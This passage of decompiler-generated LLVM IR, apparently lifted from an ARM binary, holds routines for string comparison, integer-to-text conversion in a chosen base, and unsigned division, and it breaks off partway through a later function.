  %v0_13198 = icmp eq i32 %v0_1314c, %v1_13190.pn
  %v1_13198 = icmp slt i32 %v1_13198.in, 0
  %v2_13198 = icmp slt i32 %v2_13198.in, 0
  %v3_13198 = xor i1 %v2_13198, %v1_13198
  %v4_13198 = or i1 %v0_13198, %v3_13198
  br i1 %v4_13198, label %dec_label_pc_131a8.preheader, label %dec_label_pc_131c0

dec_label_pc_131a8.preheader:                     ; preds = %bb28
  %v2_131a85 = icmp eq i32 %v0_1314c, 0
  br i1 %v2_131a85, label %dec_label_pc_131c8, label %dec_label_pc_131b0

dec_label_pc_131a0:                               ; preds = %dec_label_pc_131b0
  %v1_131a0 = add i32 %v0_131a0, 1
  %v1_131a4 = add i32 %v0_131a4, 1
  store i32 %v1_131a4, i32* %r1.global-to-local, align 4
  %v2_131a8 = icmp eq i32 %v0_131a8, 0
  br i1 %v2_131a8, label %dec_label_pc_131c8, label %dec_label_pc_131b0

dec_label_pc_131b0:                               ; preds = %dec_label_pc_131a0, %dec_label_pc_131a8.preheader
  %v0_131a8.in = phi i32 [ %v0_131a8, %dec_label_pc_131a0 ], [ %v0_1314c, %dec_label_pc_131a8.preheader ]
  %v0_131a4 = phi i32 [ %v1_131a4, %dec_label_pc_131a0 ], [ %v0_1316c, %dec_label_pc_131a8.preheader ]
  %v0_131a0 = phi i32 [ %v1_131a0, %dec_label_pc_131a0 ], [ %tmp, %dec_label_pc_131a8.preheader ]
  %v0_131a8 = add i32 %v0_131a8.in, -1
  %v1_131b0 = inttoptr i32 %v0_131a0 to i8*
  %v2_131b0 = load i8, i8* %v1_131b0, align 1
  %v3_131b0 = zext i8 %v2_131b0 to i32
  store i32 %v3_131b0, i32* %r2.global-to-local, align 4
  %v1_131b4 = inttoptr i32 %v0_131a4 to i8*
  %v2_131b4 = load i8, i8* %v1_131b4, align 1
  %v9_131b8 = icmp eq i8 %v2_131b0, %v2_131b4
  br i1 %v9_131b8, label %dec_label_pc_131a0, label %dec_label_pc_131c0

dec_label_pc_131c0:                               ; preds = %dec_label_pc_131b0, %bb28
  ret i32 0

dec_label_pc_131c8:                               ; preds = %dec_label_pc_131a0, %dec_label_pc_131a8.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_131a0, { 1, 0 }
  uselistorder i32 %v0_131a4, { 1, 0 }
  uselistorder i32 %v1_13190, { 0, 3, 1, 2 }
  uselistorder i32 %v1_13180, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1314c, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_13144, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_131d0(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_131d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_131d0 = load i32, i32* @r4, align 4
  store i32 %v3_131d0, i32* %stack_var_-28, align 4
  %v22_131d0 = ptrtoint i32* %stack_var_-28 to i32
  %v0_131d4 = load i32, i32* @r2, align 4
  store i32 %v0_131d4, i32* %r8.global-to-local, align 4
  %v2_131d4 = icmp eq i32 %v0_131d4, 0
  store i1 %v2_131d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_131d4, label %dec_label_pc_132c4, label %dec_label_pc_131e4

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131d0
  %v3_131e4 = icmp eq i8 %arg1, 0
  store i1 %v3_131e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_131e4, label %.thread, label %dec_label_pc_131f8

.thread:                                          ; preds = %dec_label_pc_131e4
  %v4_131ec = inttoptr i32 %v0_131d4 to i8*
  store i8 48, i8* %v4_131ec, align 1
  %v0_131f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_131f0.pr.pr, label %.thread1, label %dec_label_pc_131f8

.thread1:                                         ; preds = %.thread
  %v4_131f0 = load i32, i32* %r8.global-to-local, align 4
  %v5_131f0 = add i32 %v4_131f0, 1
  %v6_131f0 = inttoptr i32 %v5_131f0 to i8*
  store i8 0, i8* %v6_131f0, align 1
  %v0_131f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_131f4.pr.pr, label %dec_label_pc_132c4, label %dec_label_pc_131f8

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131e4, %.thread, %.thread1
  %v7_131fc = icmp eq i32 %arg2, 10
  store i1 %v7_131fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_131fc, label %bb, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_131f8
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_131f8
  %tmp39 = icmp slt i8 %arg1, 0
  %phitmp = icmp eq i1 %tmp39, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_13220

.thread4:                                         ; preds = %bb, %.thread21
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13230

dec_label_pc_13220:                               ; preds = %bb
  %v2_13220 = sub nsw i32 0, %tmp
  store i32 %v2_13220, i32* %r4.global-to-local, align 4
  store i1 %v3_131e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_131e4, label %dec_label_pc_132d0, label %dec_label_pc_13230

dec_label_pc_13230:                               ; preds = %dec_label_pc_13220, %.thread4
  %v0_1323810 = phi i32 [ %tmp, %.thread4 ], [ %v2_13220, %dec_label_pc_13220 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_13220 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_13234 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_13234, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %bb37, %dec_label_pc_13230
  %v0_13238 = phi i32 [ %v0_1325c, %bb37 ], [ %v0_1323810, %dec_label_pc_13230 ]
  store i32 %v0_13238, i32* %r0.global-to-local, align 4
  %v0_1323c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1323c, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_13238, 16777216
  %v1_13240 = sdiv i32 %sext, 16777216
  %v3_13240 = call i32 @function_133f8(i32 %v1_13240, i32 %v0_1323c)
  store i32 %v3_13240, i32* %r0.global-to-local, align 4
  %v7_13244 = icmp eq i32 %v3_13240, 9
  store i1 %v7_13244, i1* %cpsr_z.global-to-local, align 1
  %v1_13248 = add i32 %v3_13240, 48
  %v0_1324c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1324c, i32* @r1, align 4
  %v7_13250 = icmp sgt i32 %v3_13240, 9
  %extract.t = trunc i32 %v1_13248 to i8
  br i1 %v7_13250, label %bb36, label %bb37

bb36:                                             ; preds = %dec_label_pc_13238
  %v9_13250 = add i32 %v3_13240, 55
  %extract.t20 = trunc i32 %v9_13250 to i8
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_13238, %bb36
  %v0_13258.off0 = phi i8 [ %extract.t, %dec_label_pc_13238 ], [ %extract.t20, %bb36 ]
  %v0_13254 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13254, i32* @r0, align 4
  %v2_13258 = load i32, i32* %r7.global-to-local, align 4
  %v3_13258 = inttoptr i32 %v2_13258 to i8*
  store i8 %v0_13258.off0, i8* %v3_13258, align 1
  %v4_13258 = load i32, i32* %r7.global-to-local, align 4
  %v5_13258 = add i32 %v4_13258, -1
  store i32 %v5_13258, i32* %r7.global-to-local, align 4
  %v0_1325c = call i32 @function_132e8()
  store i32 %v0_1325c, i32* %r0.global-to-local, align 4
  store i32 %v0_1325c, i32* %r4.global-to-local, align 4
  %v2_13260 = icmp eq i32 %v0_1325c, 0
  store i1 %v2_13260, i1* %cpsr_z.global-to-local, align 1
  %v0_13264 = load i32, i32* %r6.global-to-local, align 4
  %v1_13264 = add i32 %v0_13264, -1
  store i32 %v1_13264, i32* %r6.global-to-local, align 4
  br i1 %v2_13260, label %dec_label_pc_1326c, label %dec_label_pc_13238

dec_label_pc_1326c:                               ; preds = %bb37
  %v0_1326c = load i32, i32* %sl.global-to-local, align 4
  %v2_1326c = icmp eq i32 %v0_1326c, 0
  store i1 %v2_1326c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1326c, label %bb38, label %dec_label_pc_132d4

bb38:                                             ; preds = %dec_label_pc_1326c
  store i32 %v0_13264, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %bb38, %dec_label_pc_132d4
  %v1_13284 = phi i32 [ %v0_13264, %bb38 ], [ %v1_1327c.pre, %dec_label_pc_132d4 ]
  %v2_13278 = ptrtoint i32* %stack_var_-62 to i32
  %v2_1327c = add i32 %v1_13284, %v2_13278
  %v3_1327c = inttoptr i32 %v2_1327c to i8*
  %v4_1327c = load i8, i8* %v3_1327c, align 1
  %v6_1327c = zext i8 %v4_1327c to i32
  %v2_13280 = icmp eq i8 %v4_1327c, 0
  store i1 %v2_13280, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1327c, i32* %r1.global-to-local, align 4
  br i1 %v2_13280, label %dec_label_pc_132a8, label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13278
  br label %dec_label_pc_13290

dec_label_pc_13290:                               ; preds = %dec_label_pc_13290, %dec_label_pc_1328c
  %v0_13290 = phi i32 [ %v1_13290, %dec_label_pc_13290 ], [ 0, %dec_label_pc_1328c ]
  %v1_13290 = add i32 %v0_13290, 1
  store i32 %v1_13290, i32* @r2, align 4
  %v2_13294 = add i32 %v1_13290, %v2_1327c
  %v3_13294 = inttoptr i32 %v2_13294 to i8*
  %v4_13294 = load i8, i8* %v3_13294, align 1
  %v2_13298 = icmp eq i8 %v4_13294, 0
  store i1 %v2_13298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13298, label %dec_label_pc_132a0, label %dec_label_pc_13290

dec_label_pc_132a0:                               ; preds = %dec_label_pc_13290
  %v7_132a0 = icmp eq i32 %v0_13290, -2
  store i1 %v7_132a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_132a0, label %dec_label_pc_132c4, label %dec_label_pc_132a8

dec_label_pc_132a8:                               ; preds = %dec_label_pc_132a0, %dec_label_pc_13278
  %v0_132b017 = phi i32 [ %v1_13290, %dec_label_pc_132a0 ], [ %v6_1327c, %dec_label_pc_13278 ]
  store i32 %v2_1327c, i32* %r0.global-to-local, align 4
  %v0_132ac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_132ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_132b0.dec_label_pc_132b0_crit_edge, %dec_label_pc_132a8
  %v2_132bc = phi i32 [ %v5_132bc, %dec_label_pc_132b0.dec_label_pc_132b0_crit_edge ], [ %v0_132ac, %dec_label_pc_132a8 ]
  %v0_132b4 = phi i32 [ %v0_132b4.pre, %dec_label_pc_132b0.dec_label_pc_132b0_crit_edge ], [ %v2_1327c, %dec_label_pc_132a8 ]
  %v0_132b0 = phi i32 [ %v0_132b0.pre, %dec_label_pc_132b0.dec_label_pc_132b0_crit_edge ], [ %v0_132b017, %dec_label_pc_132a8 ]
  %v1_132b0 = add i32 %v0_132b0, -1
  store i32 %v1_132b0, i32* @r2, align 4
  %v1_132b4 = inttoptr i32 %v0_132b4 to i8*
  %v2_132b4 = load i8, i8* %v1_132b4, align 1
  %v5_132b4 = add i32 %v0_132b4, 1
  store i32 %v5_132b4, i32* %r0.global-to-local, align 4
  %v3_132b8 = icmp eq i32 %v0_132b0, 0
  store i1 %v3_132b8, i1* %cpsr_z.global-to-local, align 1
  %v3_132bc = inttoptr i32 %v2_132bc to i8*
  store i8 %v2_132b4, i8* %v3_132bc, align 1
  %v4_132bc = load i32, i32* %r1.global-to-local, align 4
  %v5_132bc = add i32 %v4_132bc, 1
  store i32 %v5_132bc, i32* %r1.global-to-local, align 4
  br i1 %v3_132b8, label %dec_label_pc_132c4, label %dec_label_pc_132b0.dec_label_pc_132b0_crit_edge

dec_label_pc_132b0.dec_label_pc_132b0_crit_edge:  ; preds = %dec_label_pc_132b0
  %v0_132b0.pre = load i32, i32* @r2, align 4
  %v0_132b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132c4:                               ; preds = %dec_label_pc_132b0, %dec_label_pc_132a0, %.thread1, %dec_label_pc_131d0
  %v0_132c4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_132c4, i32* %r0.global-to-local, align 4
  %v2_132cc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_132cc, i32* @r4, align 4
  ret i32 %v0_132c4

dec_label_pc_132d0:                               ; preds = %dec_label_pc_13220
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_132d4

dec_label_pc_132d4:                               ; preds = %dec_label_pc_1326c, %dec_label_pc_132d0
  %v1_132d8 = phi i32 [ %v1_13264, %dec_label_pc_1326c ], [ 32, %dec_label_pc_132d0 ]
  %v2_132d8 = add i32 %v1_132d8, %v22_131d0
  %v3_132e0 = add i32 %v2_132d8, -34
  %v4_132e0 = inttoptr i32 %v3_132e0 to i8*
  store i8 45, i8* %v4_132e0, align 1
  %v1_1327c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13278

; uselistorder directives
  uselistorder i32 %v5_132bc, { 1, 0 }
  uselistorder i1 %v3_132b8, { 1, 0 }
  uselistorder i32 %v0_132b4, { 1, 0 }
  uselistorder i1 %v7_132a0, { 1, 0 }
  uselistorder i32 %v1_13290, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1327c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1325c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_13240, { 1, 0, 2, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_131e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_131d4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 7, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 12, 11, 13, 14 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132d4, { 1, 0 }
  uselistorder label %dec_label_pc_13278, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_131f8, { 2, 1, 0 }
}

define i32 @function_132e8() local_unnamed_addr {
dec_label_pc_132e8:
  %v0_132e8 = load i32, i32* @r1, align 4
  %v1_132e8 = add i32 %v0_132e8, -1
  %v7_132e8 = icmp eq i32 %v0_132e8, 1
  br i1 %v7_132e8, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_132e8
  %v2_132ec = load i32, i32* @r0, align 4
  ret i32 %v2_132ec

bb82:                                             ; preds = %dec_label_pc_132e8
  %v2_132e8 = icmp eq i32 %v0_132e8, 0
  br i1 %v2_132e8, label %dec_label_pc_133d0, label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %bb82
  %v0_132f4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_132f4, %v0_132e8
  br i1 %tmp, label %dec_label_pc_132fc, label %dec_label_pc_13388

dec_label_pc_132fc:                               ; preds = %dec_label_pc_132f4
  %v2_132fc = and i32 %v1_132e8, %v0_132e8
  %v4_132fc = icmp eq i32 %v2_132fc, 0
  br i1 %v4_132fc, label %dec_label_pc_13394, label %dec_label_pc_13304

dec_label_pc_13304:                               ; preds = %dec_label_pc_132fc
  %v3_13304 = icmp ult i32 %v0_132e8, 536870912
  br i1 %v3_13304, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13304
  %v4_13308 = mul i32 %v0_132e8, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13304, %.thread
  %v0_13328.pr36.ph = phi i32 [ %v4_13308, %.thread ], [ %v0_132e8, %dec_label_pc_13304 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13304 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_13328.pr36 = phi i32 [ %v4_1331c, %bb85 ], [ %v0_13328.pr36.ph, %.preheader.preheader ]
  %v1_13320 = phi i32 [ %v4_13320, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_13314 = icmp ugt i32 %v0_13328.pr36, 268435455
  br i1 %v2_13314, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13328thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_13318 = icmp ult i32 %v0_13328.pr36, %v0_132f4
  br i1 %v4_13318, label %bb84, label %dec_label_pc_13328thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_1331c = and i32 %v0_13328.pr36, 268435456
  %v3_1331c = icmp eq i32 %v2_1331c, 0
  %v4_1331c = mul i32 %v0_13328.pr36, 16
  br i1 %v3_1331c, label %bb85, label %dec_label_pc_13328.loopexit

bb85:                                             ; preds = %bb84
  %v2_13320 = and i32 %v1_13320, 268435456
  %v3_13320 = icmp eq i32 %v2_13320, 0
  %v4_13320 = mul i32 %v1_13320, 16
  br i1 %v3_13320, label %.preheader, label %dec_label_pc_13328thread-pre-split.loopexit.loopexit

dec_label_pc_13328thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_1333448.ph = phi i32 [ %v1_13320, %bb83 ], [ %v4_13320, %bb85 ]
  %v0_13328.pr38.ph = phi i32 [ %v0_13328.pr36, %bb83 ], [ %v4_1331c, %bb85 ]
  br label %dec_label_pc_13328thread-pre-split.loopexit

dec_label_pc_13328thread-pre-split.loopexit:      ; preds = %dec_label_pc_13328thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1333448 = phi i32 [ %v1_13320, %.thread2 ], [ %v1_1333448.ph, %dec_label_pc_13328thread-pre-split.loopexit.loopexit ]
  %v0_13328.pr38 = phi i32 [ %v0_13328.pr36, %.thread2 ], [ %v0_13328.pr38.ph, %dec_label_pc_13328thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13328thread-pre-split

dec_label_pc_13328thread-pre-split:               ; preds = %dec_label_pc_13328thread-pre-split.loopexit, %bb87
  %v1_1333446 = phi i32 [ %v1_1333448, %dec_label_pc_13328thread-pre-split.loopexit ], [ %v3_13334, %bb87 ]
  %v0_13328.pr = phi i32 [ %v0_13328.pr38, %dec_label_pc_13328thread-pre-split.loopexit ], [ %v3_13330, %bb87 ]
  br label %dec_label_pc_13328

dec_label_pc_13328.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_13328

dec_label_pc_13328:                               ; preds = %dec_label_pc_13328.loopexit, %dec_label_pc_13328thread-pre-split
  %v1_13334 = phi i32 [ %v1_1333446, %dec_label_pc_13328thread-pre-split ], [ %v1_13320, %dec_label_pc_13328.loopexit ]
  %v1_13330 = phi i32 [ %v0_13328.pr, %dec_label_pc_13328thread-pre-split ], [ %v4_1331c, %dec_label_pc_13328.loopexit ]
  %v2_13328 = icmp slt i32 %v1_13330, 0
  br i1 %v2_13328, label %dec_label_pc_1333c, label %bb86

bb86:                                             ; preds = %dec_label_pc_13328
  %v4_1332c = icmp ult i32 %v1_13330, %v0_132f4
  br i1 %v4_1332c, label %bb87, label %dec_label_pc_1333c

bb87:                                             ; preds = %bb86
  %v3_13330 = mul i32 %v1_13330, 2
  %v2_13334 = icmp slt i32 %v1_13334, 0
  %v3_13334 = mul i32 %v1_13334, 2
  br i1 %v2_13334, label %dec_label_pc_1333c, label %dec_label_pc_13328thread-pre-split

dec_label_pc_1333c:                               ; preds = %bb86, %dec_label_pc_13328, %bb87
  %v2_1334859 = phi i32 [ %v3_13334, %bb87 ], [ %v1_13334, %bb86 ], [ %v1_13334, %dec_label_pc_13328 ]
  %v1_1334051 = phi i32 [ %v3_13330, %bb87 ], [ %v1_13330, %bb86 ], [ %v1_13330, %dec_label_pc_13328 ]
  br label %dec_label_pc_13340

dec_label_pc_13340:                               ; preds = %.thread11, %dec_label_pc_1333c
  %v1_13374 = phi i32 [ %v4_13374, %.thread11 ], [ %v2_1334859, %dec_label_pc_1333c ]
  %v1_13348 = phi i32 [ %v0_13380, %.thread11 ], [ 0, %dec_label_pc_1333c ]
  %v1_13378 = phi i32 [ %v4_13378, %.thread11 ], [ %v1_1334051, %dec_label_pc_1333c ]
  %v1_13344 = phi i32 [ %v0_13370, %.thread11 ], [ %v0_132f4, %dec_label_pc_1333c ]
  %v3_13340 = icmp ult i32 %v1_13344, %v1_13378
  br i1 %v3_13340, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_13340
  %v3_13344 = sub i32 %v1_13344, %v1_13378
  %v3_13348 = or i32 %v1_13348, %v1_13374
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13340, %bb88
  %v1_13350 = phi i32 [ %v1_13344, %dec_label_pc_13340 ], [ %v3_13344, %bb88 ]
  %v1_13354 = phi i32 [ %v1_13348, %dec_label_pc_13340 ], [ %v3_13348, %bb88 ]
  %v4_1334c = udiv i32 %v1_13378, 2
  %v6_1334c = icmp ult i32 %v1_13350, %v4_1334c
  br i1 %v6_1334c, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_13350 = urem i32 %v1_13378, 2
  %v4_13350 = icmp eq i32 %v3_13350, 0
  %v6_13350 = sub i32 %v1_13350, %v4_1334c
  br i1 %v4_13350, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13354 = udiv i32 %v1_13374, 2
  %v6_13354 = or i32 %v1_13354, %v5_13354
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_1335c = phi i32 [ %v6_13350, %bb89 ], [ %v1_13350, %.thread7 ], [ %v6_13350, %bb90 ]
  %v1_13360 = phi i32 [ %v1_13354, %bb89 ], [ %v1_13354, %.thread7 ], [ %v6_13354, %bb90 ]
  %v4_13358 = udiv i32 %v1_13378, 4
  %v6_13358 = icmp ult i32 %v1_1335c, %v4_13358
  br i1 %v6_13358, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_1335c = and i32 %v1_13378, 2
  %v4_1335c = icmp eq i32 %v3_1335c, 0
  %v6_1335c = sub i32 %v1_1335c, %v4_13358
  br i1 %v4_1335c, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_13360 = udiv i32 %v1_13374, 4
  %v6_13360 = or i32 %v1_13360, %v5_13360
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_13368 = phi i32 [ %v6_1335c, %bb91 ], [ %v1_1335c, %.thread8 ], [ %v6_1335c, %bb92 ]
  %v1_1336c = phi i32 [ %v1_13360, %bb91 ], [ %v1_13360, %.thread8 ], [ %v6_13360, %bb92 ]
  %v4_13364 = udiv i32 %v1_13378, 8
  %v6_13364 = icmp ult i32 %v1_13368, %v4_13364
  br i1 %v6_13364, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_13368 = and i32 %v1_13378, 4
  %v4_13368 = icmp eq i32 %v3_13368, 0
  %v6_13368 = sub i32 %v1_13368, %v4_13364
  br i1 %v4_13368, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1336c = udiv i32 %v1_13374, 8
  %v6_1336c = or i32 %v1_1336c, %v5_1336c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_13380 = phi i32 [ %v1_1336c, %bb93 ], [ %v1_1336c, %.thread9 ], [ %v6_1336c, %bb94 ]
  %v0_13370 = phi i32 [ %v6_13368, %bb93 ], [ %v1_13368, %.thread9 ], [ %v6_13368, %bb94 ]
  %v2_13370 = icmp eq i32 %v0_13370, 0
  br i1 %v2_13370, label %dec_label_pc_13380, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_13374, 16
  br i1 %tmp142, label %dec_label_pc_13380, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_13374 = udiv i32 %v1_13374, 16
  %v4_13378 = udiv i32 %v1_13378, 16
  br label %dec_label_pc_13340

dec_label_pc_13380:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_13380

dec_label_pc_13388:                               ; preds = %dec_label_pc_132f4
  %v9_132f4 = icmp eq i32 %v0_132f4, %v0_132e8
  %. = zext i1 %v9_132f4 to i32
  ret i32 %.

dec_label_pc_13394:                               ; preds = %dec_label_pc_132fc
  %v2_13394 = icmp ugt i32 %v0_132e8, 65535
  br i1 %v2_13394, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_13394
  %v2_13398 = and i32 %v0_132e8, 32768
  %v3_13398 = icmp eq i32 %v2_13398, 0
  %v4_13398 = udiv i32 %v0_132e8, 65536
  br i1 %v3_13398, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_13394
  %v0_133a465 = phi i32 [ %v0_132e8, %dec_label_pc_13394 ], [ %v4_13398, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_133a8 = phi i32 [ %v0_133a465, %.thread16 ], [ %v4_13398, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_133a4 = icmp ugt i32 %v1_133a8, 255
  br i1 %v2_133a4, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_133a8 = and i32 %v1_133a8, 128
  %v3_133a8 = icmp eq i32 %v2_133a8, 0
  %v4_133a8 = udiv i32 %v1_133a8, 256
  br i1 %v3_133a8, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_133ac = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_133b8 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_133ac, %bb102 ]
  %v1_133b4 = phi i32 [ %v1_133a8, %bb100 ], [ %v4_133a8, %bb101 ], [ %v4_133a8, %bb102 ]
  %v2_133b0 = icmp ugt i32 %v1_133b4, 15
  br i1 %v2_133b0, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_133b4 = and i32 %v1_133b4, 8
  %v3_133b4 = icmp eq i32 %v2_133b4, 0
  %v4_133b4 = udiv i32 %v1_133b4, 16
  br i1 %v3_133b4, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_133b8 = add nsw i32 %v1_133b8, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_133c0 = phi i32 [ %v1_133b8, %.thread17 ], [ %v1_133b8, %bb103 ], [ %v2_133b8, %bb104 ]
  %v5_133c4 = phi i32 [ %v1_133b4, %.thread17 ], [ %v4_133b4, %bb103 ], [ %v4_133b4, %bb104 ]
  %v2_133bc = icmp ugt i32 %v5_133c4, 3
  %v7_133bc = icmp eq i32 %v5_133c4, 4
  %v2_133c0 = xor i1 %v7_133bc, true
  %v3_133c0 = and i1 %v2_133bc, %v2_133c0
  br i1 %v3_133c0, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_133c0 = add nsw i32 %v4_133c0, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_133c4 = phi i32 [ %v4_133c0, %.thread18 ], [ %v5_133c0, %bb105 ]
  %v2_133c4 = xor i1 %v2_133bc, true
  %v3_133c4 = or i1 %v7_133bc, %v2_133c4
  br i1 %v3_133c4, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_133c4 = udiv i32 %v5_133c4, 2
  %v9_133c4 = add i32 %v4_133c4, %v8_133c4
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_133c8 = phi i32 [ %v4_133c4, %bb106 ], [ %v9_133c4, %bb107 ]
  %v6_133c8 = lshr i32 %v0_132f4, %v1_133c8
  ret i32 %v6_133c8

dec_label_pc_133d0:                               ; preds = %bb82
  %v0_133d0 = load i32, i32* @lr, align 4
  %v0_133d4 = call i32 @function_135a8()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_133d0)
  %v9_133e0 = load i32, i32* @lr, align 4
